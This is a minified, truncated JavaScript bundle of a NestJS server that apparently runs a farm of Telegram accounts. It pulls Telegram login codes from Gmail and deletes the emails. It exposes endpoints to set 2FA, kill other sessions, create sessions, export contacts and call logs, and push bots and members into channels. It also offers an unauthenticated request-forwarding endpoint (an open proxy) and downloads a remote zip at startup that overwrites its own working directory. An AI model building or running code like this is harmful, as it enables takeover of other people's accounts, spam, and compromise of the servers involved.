(()=>{"use strict";var e={8383:function(e,t,i){var n=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0}),t.MailReader=void 0;const o=n(i(2559)),r=i(6185),a=i(3235);class s{constructor(){this.isReady=!1,this.result="",this.imap=new o.default({user:process.env.GMAIL_ADD||"",password:process.env.GMAIL_PASS||"",host:"imap.gmail.com",port:993,tls:!0,tlsOptions:{rejectUnauthorized:!1}}),this.imap.on("ready",(()=>{console.log("Mail is Ready"),this.isReady=!0})),this.imap.on("error",(e=>{console.error("SomeError:",e),this.isReady=!1})),this.imap.on("end",(()=>{console.log("Connection ended"),this.isReady=!1}))}static getInstance(){return s.instance||(s.instance=new s),s.instance}async connectToMail(){console.log("Connecting to mail server");try{this.imap.connect(),this.isReady=!0,console.log("Connected to mail server")}catch(e){throw console.error("Error connecting to mail server:",(0,a.parseError)(e)),e}}async disconnectFromMail(){console.log("Disconnecting from mail server");try{this.imap.end(),this.isReady=!1,console.log("Disconnected from mail server")}catch(e){throw console.error("Error disconnecting from mail server:",(0,a.parseError)(e)),e}}async isMailReady(){return this.isReady}async getCode(){console.log("MailReady : ",this.isReady),this.isReady||(console.log("Re-Connecting mail server"),await this.connectToMail(),await(0,r.sleep)(1e4));try{await this.openInbox();const e=[["FROM","noreply@telegram.org"]],t={bodies:["HEADER","TEXT"],markSeen:!0};console.log("Inbox Opened");const i=await new Promise(((t,i)=>{this.imap.search(e,((e,n)=>{e?(console.error("Search error:",(0,a.parseError)(e)),i(e)):t(n)}))}));if(i.length>0){console.log("Emails found:",i.length);const e=i.length,n=this.imap.fetch([i[e-1]],t);await new Promise(((t,o)=>{n.on("message",((n,a)=>{const s=[];n.on("body",((e,t)=>{let i="";e.on("data",(e=>i+=e.toString("utf8"))),e.on("end",(()=>{"TEXT"===t.which&&s.push(i),this.imap.seq.addFlags([a],"\\Deleted",(e=>{e&&o(e),this.imap.expunge((e=>{e&&o(e),console.log("Deleted message")}))}))}))})),n.once("end",(()=>{console.log(`Email #${a}, Latest ${i[e-1]}`),console.log("EmailDataLength:",s.length),console.log("Mail:",s[s.length-1].split(".")),this.result=(0,r.fetchNumbersFromString)(s[s.length-1].split(".")[0]),t()}))})),n.once("end",(()=>{console.log("Fetched mails"),t()}))}))}else console.log("No new emails found");return console.log("Returning result:",this.result),this.result}catch(e){throw console.error("Error:",e),this.isReady=!1,e}}async openInbox(){await new Promise(((e,t)=>{this.imap.openBox("INBOX",!1,(i=>{i?(console.error("Open Inbox error:",(0,a.parseError)(i)),t(i)):(console.log("Inbox opened"),e())}))}))}}t.MailReader=s},6509:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}},a=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0}),t.AppController=void 0;const s=i(3563),c=i(2918),l=i(9742),p=a(i(8938)),d=i(8953),u=i(6982);let m=class{constructor(e){this.appService=e,this.logger=new s.Logger("AppController")}getHello(){return this.appService.getHello()}async executeRequest(e,t){const i=(0,u.randomUUID)(),n=Date.now();try{const{url:o,method:r="GET",headers:a={},data:s,params:c,responseType:l="json",timeout:d=3e4,followRedirects:u=!0,maxRedirects:m=5}=e;this.logger.log({message:"Executing HTTP request",requestId:i,details:{url:o,method:r,headers:this.sanitizeHeaders(a),params:c,responseType:l,timeout:d,dataSize:s?JSON.stringify(s).length:0}});const g=await(0,p.default)({url:o,method:r,headers:a,data:s,params:c,responseType:l,timeout:d,maxRedirects:u?m:0,maxContentLength:1/0,maxBodyLength:1/0,validateStatus:()=>!0,decompress:!0});return t.status(g.status),Object.entries(g.headers).forEach((([e,i])=>{"transfer-encoding"!==e.toLowerCase()&&(Array.isArray(i),t.setHeader(e,i))})),this.logger.log({message:"Request completed",requestId:i,metrics:{executionTime:Date.now()-n,status:g.status,contentType:g.headers["content-type"]}}),"arraybuffer"===l||g.headers["content-type"]?.includes("application/octet-stream")||g.headers["content-type"]?.includes("image/")||g.headers["content-type"]?.includes("audio/")||g.headers["content-type"]?.includes("video/")||g.headers["content-type"]?.includes("application/pdf")?(!t.getHeader("content-type")&&g.headers["content-type"]&&t.setHeader("content-type",g.headers["content-type"]),t.send(Buffer.from(g.data))):t.send(g.data)}catch(e){return this.logger.error({message:"Request failed",requestId:i,error:{message:e.message,code:e.code,stack:e.stack}}),e.response?(Object.entries(e.response.headers).forEach((([e,i])=>{"transfer-encoding"!==e.toLowerCase()&&(Array.isArray(i),t.setHeader(e,i))})),t.status(e.response.status).send(e.response.data)):t.status(500).json({message:e.message,code:e.code})}}sanitizeHeaders(e){const t=["authorization","cookie","set-cookie"];return Object.entries(e).reduce(((e,[i,n])=>(t.includes(i.toLowerCase())?e[i]="[REDACTED]":e[i]=n,e)),{})}};t.AppController=m,n([(0,s.Get)(),o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",String)],m.prototype,"getHello",null),n([(0,s.Post)("execute-request"),(0,l.ApiOperation)({summary:"Execute an HTTP request with given details"}),r(0,(0,s.Body)(new s.ValidationPipe({transform:!0}))),r(1,(0,s.Res)()),o("design:type",Function),o("design:paramtypes",[d.ExecuteRequestDto,Object]),o("design:returntype",Promise)],m.prototype,"executeRequest",null),t.AppController=m=n([(0,s.Controller)(),o("design:paramtypes",[c.AppService])],m)},3205:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.AppModule=void 0;const o=i(3563),r=i(7422),a=i(6158),s=i(8009),c=i(282),l=i(8421),p=i(3322),d=i(6061),u=i(5774),m=i(1324),g=i(6509),h=i(2918),y=i(3924),f=i(3177),v=i(7106),b=i(5014),w=i(4181),P=i(5471),S=i(3085),A=i(1373),C=i(886),I=i(9605),M=i(889),O=i(1977);let R=class{configure(e){e.apply(y.LoggerMiddleware).forRoutes("*")}};t.AppModule=R,t.AppModule=R=n([(0,o.Module)({imports:[u.initModule,c.TelegramModule,p.ActiveChannelsModule,s.ClientModule,a.UserDataModule,r.UsersModule,l.BufferClientModule,d.ArchivedClientModule,m.ChannelsModule,A.PromoteClientModule,f.BuildModule,v.UpiIdModule,b.PromoteMsgModule,S.PromoteStatModule,w.StatModule,P.Stat2Module,C.TgSignupModule,I.TransactionModule,M.NpointModule,O.TimestampModule],controllers:[g.AppController],providers:[h.AppService],exports:[c.TelegramModule,p.ActiveChannelsModule,s.ClientModule,a.UserDataModule,r.UsersModule,l.BufferClientModule,d.ArchivedClientModule,m.ChannelsModule,A.PromoteClientModule,C.TgSignupModule,I.TransactionModule,O.TimestampModule]})],R)},2918:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.AppService=void 0;const o=i(3563);let r=class{getHello(){return"Hello World!"}};t.AppService=r,t.AppService=r=n([(0,o.Injectable)()],r)},6790:function(e,t,i){var n=this&&this.__createBinding||(Object.create?function(e,t,i,n){void 0===n&&(n=i);var o=Object.getOwnPropertyDescriptor(t,i);o&&!("get"in o?!t.__esModule:o.writable||o.configurable)||(o={enumerable:!0,get:function(){return t[i]}}),Object.defineProperty(e,n,o)}:function(e,t,i,n){void 0===n&&(n=i),e[n]=t[i]}),o=this&&this.__setModuleDefault||(Object.create?function(e,t){Object.defineProperty(e,"default",{enumerable:!0,value:t})}:function(e,t){e.default=t}),r=this&&this.__importStar||function(e){if(e&&e.__esModule)return e;var t={};if(null!=e)for(var i in e)"default"!==i&&Object.prototype.hasOwnProperty.call(e,i)&&n(t,e,i);return o(t,e),t},a=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0}),t.CloudinaryService=void 0,console.log("in Cloudinary");const s=r(i(1416)),c=r(i(6928)),l=r(i(9896)),p=a(i(4650)),d=i(3235),u=i(9647);class m{constructor(){this.resources=new Map,s.v2.config({cloud_name:process.env.CL_NAME,api_key:process.env.CL_APIKEY,api_secret:process.env.CL_APISECRET})}static async getInstance(e){return m.instance||(m.instance=new m),await m.instance.getResourcesFromFolder(e),m.instance}async downloadAndExtractZip(e){const t=process.cwd(),i=c.resolve(t,"temp.zip"),n=c.resolve(t);console.log(`Starting download of zip file from ${e}`);const o=await(0,u.fetchWithTimeout)(e,{responseType:"arraybuffer"});if(200!==o?.status){const t=`Unable to download zip file from ${e}`;throw console.error(t),new Error(t)}{console.log("Zip file downloaded successfully."),l.writeFileSync(i,o.data),console.log(`Zip file saved to ${i}`);const e=new p.default(i);console.log(`Extracting zip file to ${n}`),e.extractAllTo(n,!0),console.log("Zip file extracted successfully."),l.unlinkSync(i),console.log(`Temporary zip file ${i} deleted.`)}}async getResourcesFromFolder(e){console.log("FETCHING NEW FILES!! from CLOUDINARY"),await this.downloadAndExtractZip(`https://promoteClients2.glitch.me/folders/${e}/files/download-all`)}async createNewFolder(e){await this.createFolder(e),await this.uploadFilesToFolder(e)}async overwriteFile(){try{const e=await s.v2.uploader.upload("./src/test.js",{resource_type:"auto",overwrite:!0,invalidate:!0,public_id:"index_nbzca5.js"});console.log(e)}catch(e){(0,d.parseError)(e)}}async findAndSaveResources(e,t){try{const{resources:i}=await s.v2.api.resources({resource_type:t,type:"upload",prefix:e,max_results:500});await Promise.all(i.map((async e=>{try{this.resources.set(e.public_id.split("/")[1].split("_")[0],e.url),await async function(e,t){try{const i=e.substring(e.lastIndexOf(".")+1),n=process.cwd(),o=c.join(n,`${t}.${i}`);console.log(o);const r=await(0,u.fetchWithTimeout)(e,{responseType:"arraybuffer"},2);if("OK"!==r?.statusText)throw new Error(`Unable to download file from ${e}`);l.existsSync(o)?(l.unlinkSync(o),l.writeFileSync(o,r.data,"binary"),console.log(`${t}.${i} Replaced!!`)):(l.writeFileSync(o,r.data,"binary"),console.log(`${t}.${i} Saved!!`))}catch(e){(0,d.parseError)(e)}}(e.url,e.public_id.split("/")[1].split("_")[0])}catch(t){console.log(e),(0,d.parseError)(t)}})))}catch(e){(0,d.parseError)(e)}}async createFolder(e){try{return await s.v2.api.create_folder(e)}catch(e){throw console.error("Error creating folder:",e),e}}async uploadFilesToFolder(e){const t=Array.from(this.resources.entries()).map((async([t,i])=>{try{return await s.v2.uploader.upload_large(i,{folder:e,resource_type:"auto",public_id:t})}catch(e){throw console.error("Error uploading file:",e),e}}));try{return await Promise.all(t)}catch(e){throw console.error("Error uploading files:",e),e}}async printResources(){try{this.resources?.forEach(((e,t)=>{console.log(t,":",e)}))}catch(e){(0,d.parseError)(e)}}get(e){try{return this.resources.get(e)||""}catch(e){(0,d.parseError)(e)}}getBuffer(e){try{return this.resources.get(e)||""}catch(e){console.log(e)}}}t.CloudinaryService=m},5691:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0}),t.ConfigurationSchema=t.Configuration=void 0;const r=i(5839),a=o(i(6037));let s=class{};t.Configuration=s,t.Configuration=s=n([(0,r.Schema)({versionKey:!1,autoIndex:!0,strict:!1,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],s),t.ConfigurationSchema=r.SchemaFactory.createForClass(s),t.ConfigurationSchema.add({type:a.default.Schema.Types.Mixed})},7902:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.ConfigurationController=void 0;const a=i(3563),s=i(9742),c=i(6759);let l=class{constructor(e){this.configurationService=e}async findOne(){return this.configurationService.findOne()}async update(e){return this.configurationService.update(e)}};t.ConfigurationController=l,n([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get configuration data"}),o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",Promise)],l.prototype,"findOne",null),n([(0,a.Patch)(),(0,s.ApiOperation)({summary:"Update configuration"}),(0,s.ApiBody)({type:Object}),r(0,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[Object]),o("design:returntype",Promise)],l.prototype,"update",null),t.ConfigurationController=l=n([(0,s.ApiTags)("Configuration"),(0,a.Controller)("configuration"),o("design:paramtypes",[c.ConfigurationService])],l)},5774:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.initModule=void 0;const a=i(3563),s=i(3428),c=i(5839),l=i(6759),p=i(5691),d=i(7902),u=i(6037),m=i(9647),g=i(6250);let h=class{constructor(e){this.connection=e}async onModuleInit(){console.log(`Started :: ${process.env.clientId}`)}async onModuleDestroy(){console.log("Init Module Destroying"),await(0,m.fetchWithTimeout)(`${(0,g.notifbot)()}&text=${encodeURIComponent(`closed :: ${process.env.clientId}`)}`),this.closeConnection()}closeConnection(){console.log("Closing mongoose connection"),this.connection.close(!0)}};t.initModule=h,t.initModule=h=n([(0,a.Global)(),(0,a.Module)({imports:[s.ConfigModule.forRoot(),c.MongooseModule.forRootAsync({useFactory:()=>({uri:process.env.mongouri})}),c.MongooseModule.forFeature([{name:"configurationModule",collection:"configuration",schema:p.ConfigurationSchema}])],providers:[l.ConfigurationService],controllers:[d.ConfigurationController],exports:[s.ConfigModule,c.MongooseModule]}),r(0,(0,a.Inject)((0,c.getConnectionToken)())),o("design:paramtypes",[u.Connection])],h)},6759:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.ConfigurationService=void 0;const a=i(3563),s=i(5839),c=i(6037),l=i(9647),p=i(6250);let d=class{constructor(e){this.configurationModel=e,this.setEnv().then((()=>{(0,l.fetchWithTimeout)(`${(0,p.notifbot)()}&text=${encodeURIComponent(`Started :: ${process.env.clientId}`)}`)}))}async OnModuleInit(){console.log("Config Module Inited")}async findOne(){const e=await this.configurationModel.findOne({}).exec();if(!e)throw new a.NotFoundException("configurationModel not found");return e}async setEnv(){console.log("Setting Envs");const e={...await this.configurationModel.findOne({},{_id:0})};for(const t in e)console.log("setting",t),process.env[t]=e[t];console.log("finished setting env")}async update(e){delete e._id;const t=await this.configurationModel.findOneAndUpdate({},{$set:{...e}},{new:!0,upsert:!0}).exec();if(!t)throw new a.NotFoundException("configurationModel not found");return t}};t.ConfigurationService=d,t.ConfigurationService=d=n([(0,a.Injectable)(),r(0,(0,s.InjectModel)("configurationModule")),o("design:paramtypes",[c.Model])],d)},7330:function(e,t,i){var n=this&&this.__createBinding||(Object.create?function(e,t,i,n){void 0===n&&(n=i);var o=Object.getOwnPropertyDescriptor(t,i);o&&!("get"in o?!t.__esModule:o.writable||o.configurable)||(o={enumerable:!0,get:function(){return t[i]}}),Object.defineProperty(e,n,o)}:function(e,t,i,n){void 0===n&&(n=i),e[n]=t[i]}),o=this&&this.__setModuleDefault||(Object.create?function(e,t){Object.defineProperty(e,"default",{enumerable:!0,value:t})}:function(e,t){e.default=t}),r=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},a=this&&this.__importStar||function(e){if(e&&e.__esModule)return e;var t={};if(null!=e)for(var i in e)"default"!==i&&Object.prototype.hasOwnProperty.call(e,i)&&n(t,e,i);return o(t,e),t},s=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},c=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.TelegramController=void 0;const l=i(3563),p=i(9742),d=i(2995),u=i(9979),m=i(4882),g=i(2354),h=i(5832),y=i(6684),f=i(9556),v=a(i(8461)),b=i(3653);let w=class{constructor(e){this.telegramService=e}async connect(e){return await b.connectionManager.getClient(e),{message:"Connected successfully"}}async disconnect(e){return await b.connectionManager.unregisterClient(e),{message:"Disconnected successfully"}}async disconnectAllClients(){return await b.connectionManager.disconnectAll(),{message:"All clients disconnected successfully"}}async getMe(e){return this.telegramService.getMe(e)}async getEntity(e,t){return this.telegramService.getEntity(e,t)}async updateProfile(e,t){return this.telegramService.updateNameandBio(e,t.firstName,t.about)}async setProfilePhoto(e,t){return this.telegramService.setProfilePic(e,t.name)}async deleteProfilePhotos(e){return this.telegramService.deleteProfilePhotos(e)}async getMessages(e,t,i){return this.telegramService.getMessages(e,t,i)}async forwardMessage(e,t){return this.telegramService.forwardBulkMessages(e,t.fromChatId,t.toChatId,t.messageIds)}async processBatchMessages(e,t){return this.telegramService.processBatch(t.items,t.batchSize||20,(async i=>{switch(t.operation){case u.BatchOperationType.FORWARD:for(const t of i)"messageId"in t&&t.fromChatId&&t.toChatId&&await this.telegramService.forwardMessage(e,t.toChatId,t.fromChatId,t.messageId);break;case u.BatchOperationType.DELETE:for(const t of i)await this.telegramService.deleteChat(e,t.chatId);break;default:throw new l.BadRequestException("Unsupported batch operation")}}),t.delayMs)}async searchMessages(e,t,i,n,o,r,a){return this.telegramService.searchMessages(e,{chatId:t,query:i,types:n,minId:r,maxId:a,limit:o})}async getChannelInfo(e,t){return this.telegramService.getChannelInfo(e,t)}async forwardMedia(e,t,i){return await b.connectionManager.getClient(e,{autoDisconnect:!1,handler:!1}),this.telegramService.forwardMedia(e,t,i)}async leaveChannel(e,t){return this.telegramService.leaveChannel(e,t)}async setup2FA(e){return this.telegramService.set2Fa(e)}async updatePrivacy(e){return this.telegramService.updatePrivacy(e)}async updatePrivacyBatch(e,t){return this.telegramService.updatePrivacyBatch(e,t)}async getActiveSessions(e){return this.telegramService.getAuths(e)}async terminateOtherSessions(e){return this.telegramService.removeOtherAuths(e)}async createNewSession(e){return this.telegramService.createNewSession(e)}async getSessionInfo(e){return this.telegramService.getSessionInfo(e)}async terminateSession(e,t){return this.telegramService.terminateSession(e,t)}async getConnectionStatus(){return{status:await this.telegramService.getConnectionStatus()}}async getCallLogStats(e){return this.telegramService.getCallLog(e)}async addContactsBulk(e,t){return this.telegramService.addContacts(e,t.phoneNumbers,t.prefix)}async getContacts(e){return await this.telegramService.getContacts(e)}async sendMedia(e,t){const i=await b.connectionManager.getClient(e);return t.type===u.MediaType.PHOTO?i.sendPhotoChat(t.chatId,t.url,t.caption,t.filename):i.sendFileChat(t.chatId,t.url,t.caption,t.filename)}async downloadMedia(e,t,i,n){return this.telegramService.downloadMediaFile(e,i,t,n)}async sendMediaAlbum(e,t){return this.telegramService.sendMediaAlbum(e,t)}async getMediaMetadata(e,t,i,n,o,r,a,s,c){return this.telegramService.getMediaMetadata(e,{chatId:t,types:i,startDate:n?new Date(n):void 0,endDate:o?new Date(o):void 0,limit:r,minId:a,maxId:s,all:c})}async getFilteredMedia(e,t,i,n,o,r,a,s){return this.telegramService.getFilteredMedia(e,{chatId:t,types:i,startDate:n?new Date(n):void 0,endDate:o?new Date(o):void 0,limit:r,minId:a,maxId:s})}async getGroupMembers(e,t){return this.telegramService.getGrpMembers(e,t)}async blockChat(e,t){return this.telegramService.blockUser(e,t)}async deleteChatHistory(e,t){return this.telegramService.deleteChat(e,t)}async sendMessageWithInlineButton(e,t,i,n){return this.telegramService.sendInlineMessage(e,t,i,n)}async getAllDialogs(e,t=500,i=0,n=!1){return this.telegramService.getDialogs(e,{limit:t,archived:n,offsetId:i})}async getLastActiveTime(e){return this.telegramService.getLastActiveTime(e)}async createGroupWithOptions(e,t){return this.telegramService.createGroupWithOptions(e,t)}async updateGroupSettings(e,t){return this.telegramService.updateGroupSettings(e,t)}async addGroupMembers(e,t){return this.telegramService.addGroupMembers(t,e.groupId,e.members)}async removeGroupMembers(e,t){return this.telegramService.removeGroupMembers(t,e.groupId,e.members)}async handleAdminOperation(e,t){return e.isPromote?this.telegramService.promoteToAdmin(t,e.groupId,e.userId,e.permissions,e.rank):this.telegramService.demoteAdmin(t,e.groupId,e.userId)}async cleanupChat(e,t){return this.telegramService.cleanupChat(e,{chatId:t.chatId,beforeDate:t.beforeDate?new Date(t.beforeDate):void 0,onlyMedia:t.onlyMedia,excludePinned:t.excludePinned})}async getChatStatistics(e,t,i="week"){return this.telegramService.getChatStatistics(e,t,i)}async scheduleMessage(e,t){return this.telegramService.scheduleMessage(e,{chatId:t.chatId,message:t.message,scheduledTime:new Date(t.scheduledTime),replyTo:t.replyTo,silent:t.silent})}async getScheduledMessages(e,t){return this.telegramService.getScheduledMessages(e,t)}async sendVoiceMessage(e,t){return this.telegramService.sendVoiceMessage(e,t)}async sendViewOnceMedia(e,t,i){return i.sourceType===u.MediaSourceType.BINARY&&t?this.telegramService.sendViewOnceMedia(e,{chatId:i.chatId,sourceType:i.sourceType,binaryData:t.buffer,caption:i.caption,filename:i.filename||t.originalname}):this.telegramService.sendViewOnceMedia(e,{chatId:i.chatId,sourceType:i.sourceType,path:i.path,base64Data:i.base64Data,caption:i.caption,filename:i.filename})}async getChatHistory(e,t,i,n){return this.telegramService.getMessagesNew(e,t,i,n)}async promoteToAdmin(e,t){return this.telegramService.promoteToAdmin(e,t.groupId,t.userId,t.permissions,t.rank)}async demoteAdmin(e,t){return this.telegramService.demoteAdmin(e,t.groupId,t.members[0])}async unblockGroupUser(e,t){return this.telegramService.unblockGroupUser(e,t.groupId,t.userId)}async getGroupAdmins(e,t){return this.telegramService.getGroupAdmins(e,t)}async getGroupBannedUsers(e,t){return this.telegramService.getGroupBannedUsers(e,t)}async exportContacts(e,t,i){const n=await this.telegramService.exportContacts(e,t.format,t.includeBlocked),o=`contacts_${e}_${(new Date).toISOString()}.${t.format}`;i.setHeader("Content-Type","vcard"===t.format?"text/vcard":"text/csv"),i.setHeader("Content-Disposition",`attachment; filename="${o}"`),i.send(n)}async importContacts(e,t){return this.telegramService.importContacts(e,t)}async manageBlockList(e,t){return this.telegramService.manageBlockList(e,t.userIds,t.block)}async getContactStatistics(e){return this.telegramService.getContactStatistics(e)}async createChatFolder(e,t){return this.telegramService.createChatFolder(e,t)}async getChatFolders(e){return this.telegramService.getChatFolders(e)}async editMessage(e,t){return this.telegramService.editMessage(e,t)}async updateChatSettings(e,t){return this.telegramService.updateChatSettings(e,t)}async sendMediaBatch(e,t){return this.telegramService.sendMediaBatch(e,t)}async hasPassword(e){return this.telegramService.hasPassword(e)}async getChats(e,t,i,n,o,r){return this.telegramService.getChats(e,{limit:t,offsetDate:i,offsetId:n,offsetPeer:o,folderId:r})}async getFileUrl(e,t,i){return this.telegramService.getFileUrl(e,t,i)}async getMessageStats(e,t){return this.telegramService.getMessageStats(e,t)}async getTopPrivateChats(e){return this.telegramService.getTopPrivateChats(e)}async addBotsToChannel(e,t){return this.telegramService.addBotsToChannel(e,t.channelIds)}};t.TelegramController=w,r([(0,l.Get)("connect/:mobile"),(0,p.ApiOperation)({summary:"Connect to Telegram"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiResponse)({status:200,description:"Successfully connected"}),(0,p.ApiResponse)({status:400,description:"Connection failed"}),c(0,(0,l.Param)("mobile")),s("design:type",Function),s("design:paramtypes",[String]),s("design:returntype",Promise)],w.prototype,"connect",null),r([(0,l.Get)("disconnect/:mobile"),(0,p.ApiOperation)({summary:"Disconnect from Telegram"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiResponse)({status:200,description:"Successfully disconnected"}),c(0,(0,l.Param)("mobile")),s("design:type",Function),s("design:paramtypes",[String]),s("design:returntype",Promise)],w.prototype,"disconnect",null),r([(0,l.Post)("disconnect-all"),(0,p.ApiOperation)({summary:"Disconnect all clients"}),(0,p.ApiResponse)({status:200,description:"All clients disconnected successfully"}),s("design:type",Function),s("design:paramtypes",[]),s("design:returntype",Promise)],w.prototype,"disconnectAllClients",null),r([(0,l.Get)("me/:mobile"),(0,p.ApiOperation)({summary:"Get current user profile"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiResponse)({status:200,description:"Profile retrieved successfully"}),c(0,(0,l.Param)("mobile")),s("design:type",Function),s("design:paramtypes",[String]),s("design:returntype",Promise)],w.prototype,"getMe",null),r([(0,l.Get)("entity/:mobile/:entity"),(0,p.ApiOperation)({summary:"Get Entity profile"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiParam)({name:"entity",description:"Entity identifier",required:!0}),(0,p.ApiResponse)({status:200,description:"Entity retrieved successfully"}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Param)("entity")),s("design:type",Function),s("design:paramtypes",[String,String]),s("design:returntype",Promise)],w.prototype,"getEntity",null),r([(0,l.Post)("profile/update/:mobile"),(0,p.ApiOperation)({summary:"Update profile information"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiBody)({type:u.UpdateProfileDto}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Body)()),s("design:type",Function),s("design:paramtypes",[String,u.UpdateProfileDto]),s("design:returntype",Promise)],w.prototype,"updateProfile",null),r([(0,l.Post)("profile/photo/:mobile"),(0,p.ApiOperation)({summary:"Set profile photo"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiBody)({type:u.ProfilePhotoDto}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Body)()),s("design:type",Function),s("design:paramtypes",[String,u.ProfilePhotoDto]),s("design:returntype",Promise)],w.prototype,"setProfilePhoto",null),r([(0,l.Delete)("profile/photos/:mobile"),(0,p.ApiOperation)({summary:"Delete all profile photos"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),c(0,(0,l.Param)("mobile")),s("design:type",Function),s("design:paramtypes",[String]),s("design:returntype",Promise)],w.prototype,"deleteProfilePhotos",null),r([(0,l.Get)("messages/:mobile"),(0,p.ApiOperation)({summary:"Get chat messages"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiQuery)({name:"chatId",required:!0}),(0,p.ApiQuery)({name:"limit",required:!1,type:Number}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Query)("chatId")),c(2,(0,l.Query)("limit")),s("design:type",Function),s("design:paramtypes",[String,String,Number]),s("design:returntype",Promise)],w.prototype,"getMessages",null),r([(0,l.Post)("messages/forward/:mobile"),(0,p.ApiOperation)({summary:"Forward 